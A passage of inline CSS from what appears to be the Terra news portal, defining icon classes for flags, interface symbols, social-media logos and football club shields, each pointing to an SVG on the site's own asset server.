			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-portugal.svg")
		}

		.zaz--standalone .icon-flag-russia {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-russia.svg")
		}

		.zaz--standalone .icon-flag-southkorea {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-southkorea.svg")
		}

		.zaz--standalone .icon-flag-spain {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-spain.svg")
		}

		.zaz--standalone .icon-flag-state-ac {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-state-ac.svg")
		}

		.zaz--standalone .icon-flag-state-al {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-state-al.svg")
		}

		.zaz--standalone .icon-flag-state-am {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-state-am.svg")
		}

		.zaz--standalone .icon-flag-state-ap {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-state-ap.svg")
		}

		.zaz--standalone .icon-flag-state-ba {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-state-ba.svg")
		}

		.zaz--standalone .icon-flag-state-ce {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-state-ce.svg")
		}

		.zaz--standalone .icon-flag-state-df {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-state-df.svg")
		}

		.zaz--standalone .icon-flag-state-es {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-state-es.svg")
		}

		.zaz--standalone .icon-flag-state-go {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-state-go.svg")
		}

		.zaz--standalone .icon-flag-state-ma {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-state-ma.svg")
		}

		.zaz--standalone .icon-flag-state-mg {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-state-mg.svg")
		}

		.zaz--standalone .icon-flag-state-ms {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-state-ms.svg")
		}

		.zaz--standalone .icon-flag-state-mt {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-state-mt.svg")
		}

		.zaz--standalone .icon-flag-state-pa {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-state-pa.svg")
		}

		.zaz--standalone .icon-flag-state-pb {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-state-pb.svg")
		}

		.zaz--standalone .icon-flag-state-pe {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-state-pe.svg")
		}

		.zaz--standalone .icon-flag-state-pi {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-state-pi.svg")
		}

		.zaz--standalone .icon-flag-state-pr {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-state-pr.svg")
		}

		.zaz--standalone .icon-flag-state-rj {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-state-rj.svg")
		}

		.zaz--standalone .icon-flag-state-rn {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-state-rn.svg")
		}

		.zaz--standalone .icon-flag-state-ro {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-state-ro.svg")
		}

		.zaz--standalone .icon-flag-state-rr {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-state-rr.svg")
		}

		.zaz--standalone .icon-flag-state-rs {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-state-rs.svg")
		}

		.zaz--standalone .icon-flag-state-sc {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-state-sc.svg")
		}

		.zaz--standalone .icon-flag-state-se {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-state-se.svg")
		}

		.zaz--standalone .icon-flag-state-sp {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-state-sp.svg")
		}

		.zaz--standalone .icon-flag-state-to {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-state-to.svg")
		}

		.zaz--standalone .icon-flag-switzerland {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-switzerland.svg")
		}

		.zaz--standalone .icon-flag-uruguay {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-uruguay.svg")
		}

		.zaz--standalone .icon-flag-usa {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-usa.svg")
		}

		/*# sourceURL=https://s1.trrsf.com/update-1619184946/fe/zaz-mod-icons/_css/flagsstandalone.min.css */
	</style>
	<style type="text/css">
		.zaz--standalone .icon-attendant {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/attendant.svg")
		}

		.zaz--standalone .icon-back-to-top {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/back-to-top.svg")
		}

		.zaz--standalone .icon-ball-dark,
		.zaz--standalone .icon-goal {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/ball-dark.svg")
		}

		.zaz--standalone .icon-ball-green {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/ball-green.svg")
		}

		.zaz--standalone .icon-ball-light {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/ball-light.svg")
		}

		.zaz--standalone .icon-ball-red,
		.zaz--standalone .icon-own-goal {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/ball-red.svg")
		}

		.zaz--standalone .icon-ball-white {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/ball-white.svg")
		}

		.zaz--standalone .icon-ball,
		.zaz--standalone .icon-soccer-ball {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/ball.svg")
		}

		.zaz--standalone .icon-calendar,
		.zaz--standalone .icon-calendar-dark {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/calendar-dark.svg")
		}

		.zaz--standalone .icon-calendar-white {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/calendar-white.svg")
		}

		.zaz--standalone .icon-camera {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/camera.svg")
		}

		.zaz--standalone .icon-carnaval-orange {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/carnaval-orange.svg")
		}

		.zaz--standalone .icon-cel {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/cel.svg")
		}

		.zaz--standalone .icon-chat {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/chat.svg")
		}

		.zaz--standalone .icon-check-calendar {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/check-calendar.svg")
		}

		.zaz--standalone .icon-check,
		.zaz--standalone .icon-check-filled {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/check-filled.svg")
		}

		.zaz--standalone .icon-check-green {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/check-green.svg")
		}

		.zaz--standalone .icon-check-light {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/check-light.svg")
		}

		.zaz--standalone .icon-check-white {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/check-white.svg")
		}

		.zaz--standalone .icon-chevron-down-dark {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/chevron-down-dark.svg")
		}

		.zaz--standalone .icon-chevron-down-darkest {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/chevron-down-darkest.svg")
		}

		.zaz--standalone .icon-chevron-down-filled {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/chevron-down-filled.svg")
		}

		.zaz--standalone .icon-chevron-down-light {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/chevron-down-light.svg")
		}

		.zaz--standalone .icon-chevron-down-lighter {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/chevron-down-lighter.svg")
		}

		.zaz--standalone .icon-chevron-down-white {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/chevron-down-white.svg")
		}

		.zaz--standalone .icon-chevron-left-dark {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/chevron-left-dark.svg")
		}

		.zaz--standalone .icon-chevron-left-darkest {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/chevron-left-darkest.svg")
		}

		.zaz--standalone .icon-chevron-left-light {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/chevron-left-light.svg")
		}

		.zaz--standalone .icon-chevron-left-lighter {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/chevron-left-lighter.svg")
		}

		.zaz--standalone .icon-chevron-left-white {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/chevron-left-white.svg")
		}

		.zaz--standalone .icon-chevron-right-dark {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/chevron-right-dark.svg")
		}

		.zaz--standalone .icon-chevron-right-darkest {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/chevron-right-darkest.svg")
		}

		.zaz--standalone .icon-chevron-right-light {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/chevron-right-light.svg")
		}

		.zaz--standalone .icon-chevron-right-lighter {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/chevron-right-lighter.svg")
		}

		.zaz--standalone .icon-chevron-right-white {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/chevron-right-white.svg")
		}

		.zaz--standalone .icon-chevron-up-dark {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/chevron-up-dark.svg")
		}

		.zaz--standalone .icon-chevron-up-darkest {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/chevron-up-darkest.svg")
		}

		.zaz--standalone .icon-chevron-up-filled {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/chevron-up-filled.svg")
		}

		.zaz--standalone .icon-chevron-up-light {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/chevron-up-light.svg")
		}

		.zaz--standalone .icon-chevron-up-lighter {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/chevron-up-lighter.svg")
		}

		.zaz--standalone .icon-chevron-up-white {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/chevron-up-white.svg")
		}

		.zaz--standalone .icon-circle-play {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/circle-play.svg")
		}

		.zaz--standalone .icon-clock-light {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/clock-light.svg")
		}

		.zaz--standalone .icon-clock-white {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/clock-white.svg")
		}

		.zaz--standalone .icon-close-dark {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/close-dark.svg")
		}

		.zaz--standalone .icon-close-filled {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/close-filled.svg")
		}

		.zaz--standalone .icon-close-gray-filled {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/close-gray-filled.svg")
		}

		.zaz--standalone .icon-comment-light {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/comment-light.svg")
		}

		.zaz--standalone .icon-comment {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/comment.svg")
		}

		.zaz--standalone .icon-cup {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/cup.svg")
		}

		.zaz--standalone .icon-dash {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/dash.svg")
		}

		.zaz--standalone .icon-device_desktop {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/device_desktop.svg")
		}

		.zaz--standalone .icon-device_phone {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/device_phone.svg")
		}

		.zaz--standalone .icon-device_tablet {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/device_tablet.svg")
		}

		.zaz--standalone .icon-email {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/email.svg")
		}

		.zaz--standalone .icon-error,
		.zaz--standalone .icon-error-filled {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/error-filled.svg")
		}

		.zaz--standalone .icon-error-white {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/error-white.svg")
		}

		.zaz--standalone .icon-goto-white {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/goto-white.svg")
		}

		.zaz--standalone .icon-goto {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/goto.svg")
		}

		.zaz--standalone .icon-grid-dark {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/grid-dark.svg")
		}

		.zaz--standalone .icon-grid-light {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/grid-light.svg")
		}

		.zaz--standalone .icon-grid-orange {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/grid-orange.svg")
		}

		.zaz--standalone .icon-help {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/help.svg")
		}

		.zaz--standalone .icon-list {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/list.svg")
		}

		.zaz--standalone .icon-live-green {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/live-green.svg")
		}

		.zaz--standalone .icon-live-red {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/live-red.svg")
		}

		.zaz--standalone .icon-live-white {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/live-white.svg")
		}

		.zaz--standalone .icon-live {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/live.svg")
		}

		.zaz--standalone .icon-location-outline {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/location-outline.svg")
		}

		.zaz--standalone .icon-mail-white {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/mail-white.svg")
		}

		.zaz--standalone .icon-mail {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/mail.svg")
		}

		.zaz--standalone .icon-menu-dark {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/menu-dark.svg")
		}

		.zaz--standalone .icon-menu-white {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/menu-white.svg")
		}

		.zaz--standalone .icon-menu {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/menu.svg")
		}

		.zaz--standalone .icon-notification-bell-white {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/notification-bell-white.svg")
		}

		.zaz--standalone .icon-notification-bell {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/notification-bell.svg")
		}

		.zaz--standalone .icon-order-down {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/order-down.svg")
		}

		.zaz--standalone .icon-order-up {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/order-up.svg")
		}

		.zaz--standalone .icon-outbrain {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/outbrain.svg")
		}

		.zaz--standalone .icon-papers {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/papers.svg")
		}

		.zaz--standalone .icon-edit,
		.zaz--standalone .icon-pencil {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/pencil.svg")
		}

		.zaz--standalone .icon-phone-orange {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/phone-orange.svg")
		}

		.zaz--standalone .icon-phone {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/phone.svg")
		}

		.zaz--standalone .icon-photo-white {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/photo-white.svg")
		}

		.zaz--standalone .icon-photo {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/photo.svg")
		}

		.zaz--standalone .icon-play-white {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/play-white.svg")
		}

		.zaz--standalone .icon-play {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/play.svg")
		}

		.zaz--standalone .icon-plus {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/plus.svg")
		}

		.zaz--standalone .icon-quote-light {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/quote-light.svg")
		}

		.zaz--standalone .icon-quote {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/quote.svg")
		}

		.zaz--standalone .icon-radio-checked {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/radio-checked.svg")
		}

		.zaz--standalone .icon-radio {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/radio.svg")
		}

		.zaz--standalone .icon-receipt {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/receipt.svg")
		}

		.zaz--standalone .icon-remove {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/remove.svg")
		}

		.zaz--standalone .icon-replay {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/replay.svg")
		}

		.zaz--standalone .icon-search-dark {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/search-dark.svg")
		}

		.zaz--standalone .icon-search-light {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/search-light.svg")
		}

		.zaz--standalone .icon-search-purple {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/search-purple.svg")
		}

		.zaz--standalone .icon-search-white {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/search-white.svg")
		}

		.zaz--standalone .icon-search {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/search.svg")
		}

		.zaz--standalone .icon-settings {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/settings.svg")
		}

		.zaz--standalone .icon-share-inverse-white {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/share-inverse-white.svg")
		}

		.zaz--standalone .icon-share-inverse {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/share-inverse.svg")
		}

		.zaz--standalone .icon-share-white {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/share-white.svg")
		}

		.zaz--standalone .icon-share {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/share.svg")
		}

		.zaz--standalone .icon-social-facebook-hd {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/social-facebook-hd.svg")
		}

		.zaz--standalone .icon-social-facebook-outline-white {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/social-facebook-outline-white.svg")
		}

		.zaz--standalone .icon-social-facebook-outline {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/social-facebook-outline.svg")
		}

		.zaz--standalone .icon-social-facebook-white {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/social-facebook-white.svg")
		}

		.zaz--standalone .icon-facebook,
		.zaz--standalone .icon-social-facebook {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/social-facebook.svg")
		}

		.zaz--standalone .icon-social-flipboard {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/social-flipboard.svg")
		}

		.zaz--standalone .icon-social-gplus-outline-white {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/social-gplus-outline-white.svg")
		}

		.zaz--standalone .icon-social-gplus-outline {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/social-gplus-outline.svg")
		}

		.zaz--standalone .icon-social-gplus-white {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/social-gplus-white.svg")
		}

		.zaz--standalone .icon-gplus,
		.zaz--standalone .icon-social-gplus {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/social-gplus.svg")
		}

		.zaz--standalone .icon-social-instagram-hd {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/social-instagram-hd.svg")
		}

		.zaz--standalone .icon-social-instagram-outline-white {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/social-instagram-outline-white.svg")
		}

		.zaz--standalone .icon-social-instagram-outline {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/social-instagram-outline.svg")
		}

		.zaz--standalone .icon-social-messenger {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/social-messenger.svg")
		}

		.zaz--standalone .icon-social-pinterest-outline-white {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/social-pinterest-outline-white.svg")
		}

		.zaz--standalone .icon-social-pinterest-outline {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/social-pinterest-outline.svg")
		}

		.zaz--standalone .icon-pinterest,
		.zaz--standalone .icon-social-pinterest {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/social-pinterest.svg")
		}

		.zaz--standalone .icon-social-twitter-hd {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/social-twitter-hd.svg")
		}

		.zaz--standalone .icon-social-twitter-light {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/social-twitter-light.svg")
		}

		.zaz--standalone .icon-social-twitter-outline-white {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/social-twitter-outline-white.svg")
		}

		.zaz--standalone .icon-social-twitter-outline {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/social-twitter-outline.svg")
		}

		.zaz--standalone .icon-social-twitter-white {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/social-twitter-white.svg")
		}

		.zaz--standalone .icon-social-twitter,
		.zaz--standalone .icon-twitter {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/social-twitter.svg")
		}

		.zaz--standalone .icon-social-whatsapp {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/social-whatsapp.svg")
		}

		.zaz--standalone .icon-social-youtube-outline-white {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/social-youtube-outline-white.svg")
		}

		.zaz--standalone .icon-social-youtube-outline {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/social-youtube-outline.svg")
		}

		.zaz--standalone .icon-store {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/store.svg")
		}

		.zaz--standalone .icon-terra-clube-orange {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/terra-clube-orange.svg")
		}

		.zaz--standalone .icon-terra-clube {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/terra-clube.svg")
		}

		.zaz--standalone .icon-terra-servicos-light {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/terra-servicos-light.svg")
		}

		.zaz--standalone .icon-terra-servicos-white {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/terra-servicos-white.svg")
		}

		.zaz--standalone .icon-terra-servicos {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/terra-servicos.svg")
		}

		.zaz--standalone .icon-trending-new {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/trending-new.svg")
		}

		.zaz--standalone .icon-trending {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/trending.svg")
		}

		.zaz--standalone .icon-user-area-nightmode {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/user-area-nightmode.svg")
		}

		.zaz--standalone .icon-user-area-store {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/user-area-store.svg")
		}

		.zaz--standalone .icon-user-white {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/user-white.svg")
		}

		.zaz--standalone .icon-user {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/user.svg")
		}

		.zaz--standalone .icon-users {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/users.svg")
		}

		.zaz--standalone .icon-versus {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/versus.svg")
		}

		.zaz--standalone .icon-video-white {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/video-white.svg")
		}

		.zaz--standalone .icon-video {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/video.svg")
		}

		.zaz--standalone .icon-visited-new {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/visited-new.svg")
		}

		.zaz--standalone .icon-weather-white {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/weather-white.svg")
		}

		.zaz--standalone .icon-weather {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/essential/weather.svg")
		}

		/*# sourceURL=https://s1.trrsf.com/update-1619184945/fe/zaz-mod-icons/_css/essentialstandalone.min.css */
	</style>
	<style type="text/css">
		.zaz--standalone .icon-shield-abc,
		.zaz--standalone .team--10c6bea7a939a310VgnVCM5000009ccceb0aRCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-abc.svg")
		}

		.zaz--standalone .icon-shield-altamira,
		.zaz--standalone .team--altamira {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-altamira.svg")
		}

		.zaz--standalone .icon-shield-america-mg,
